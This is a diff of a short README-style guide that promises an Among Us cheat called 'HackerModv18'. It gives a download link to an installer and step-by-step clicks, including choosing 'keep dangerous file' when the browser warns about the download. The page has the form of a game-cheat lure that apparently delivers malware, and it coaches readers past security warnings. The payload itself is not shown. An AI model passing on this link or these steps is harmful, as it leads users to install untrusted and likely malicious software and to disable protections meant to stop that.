@@ -1,4 +1,4 @@
- Guide:
+                                                          Among us cheat is popluar to game among us                                                                                                                                                       
  First Download The HackerModv18 https://d1bsqje65yayof.cloudfront.net/installer/5793678/5436863014646490398 Then Cllck On Yes Third Click On Ok Fourth Click On Next Fifth Click On accept
  Sixth Click On Open Seventh Click ON download then click on that downlaod eighth click on show all then click on keep dangerous file the one you are dowloading now ninth click on show in folder
  tenth click on the  folder hackermodv18 then click on the godmod v18 among us 992 folder elventh step click on exract all after clicking on that godmodev18 file then click on extract
